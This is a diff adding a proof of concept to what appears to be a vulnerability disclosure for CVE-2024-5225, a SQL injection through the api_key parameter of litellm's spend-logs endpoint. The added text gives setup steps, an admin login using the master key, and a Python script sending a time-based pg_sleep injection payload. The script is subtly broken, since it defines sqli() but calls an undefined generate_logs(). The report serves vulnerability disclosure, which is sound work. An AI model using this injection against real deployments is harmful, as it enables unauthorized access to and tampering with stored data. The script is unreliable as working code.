@@ -1,10 +1,83 @@
 Title: SQL Injection through api_key in berriai/litellm
 
 Proof of Concept: 
+SETUP
 
+copy this docker-compose.yaml
+
+version: "3"
+services:
+
+  postgres:
+    image: postgres:latest
+    hostname: postgres
+    environment:
+      - POSTGRES_HOST_AUTH_METHOD=trust
+    ports:
+      - 5432:5432
+
+run the docker
+
+docker-compose up
+
+copy this config.yaml
+
+general_settings: 
+  master_key: sk-1234 # [OPTIONAL] Use to enforce auth on proxy. See - https://docs.litellm.ai/docs/proxy/virtual_keys
+  store_model_in_db: True
+  proxy_budget_rescheduler_min_time: 60
+  proxy_budget_rescheduler_max_time: 64
+  proxy_batch_write_at: 1
+  database_url: "postgresql://postgres:postgres@172.17.236.195:5432/postgres" # [OPTIONAL] use for token-based auth to proxy
+
+now install and run the server
+
+pip3 install 'litellm[proxy]'
+pip3 install litellm
+litellm --model huggingface/bigcode/starcoder --config config.yaml
+
+Exploitation
+
+login into admin panel with username admin and password sk-1234 (master key in the config)
+
+Create new api key
+
+Now copy the api key here its sk-sB8Y9wuz5xqBZiBiFxI5Dw
+
+
+
+Now Create poc.py and replace sk-sB8Y9wuz5xqBZiBiFxI5Dw with your api key
+
+For example I will inject a pg_sleep for this proof of concept
+
+import requests
+
+def sqli(apikey, injection):
+    header = {
+        "Authorization" : f"Bearer {apikey}"
+    }
+
+    params = {
+        "api_key" : f"""{injection}"""
+    }
+
+    res = requests.get("http://localhost:4000/global/spend/logs", headers=header, params=params)
+    return res.content
+
+if __name__ == "__main__":
+    generate_logs("sk-sB8Y9wuz5xqBZiBiFxI5Dw", "' AND 1222=(SELECT 1222 FROM PG_SLEEP(10)) AND 'sXvd'='sXvd")
+
+python3 poc.py
+
+Here we can observe a sleep for 10 seconds
 
 Impact: 
 An SQL injection can lead to :
+
+Unauthorized Access
+Data Manipulation
+Exposure of Confidential Information
+Denial of Service (DoS)
 
 CVE ID: CVE-2024-5225
 Status: (published)
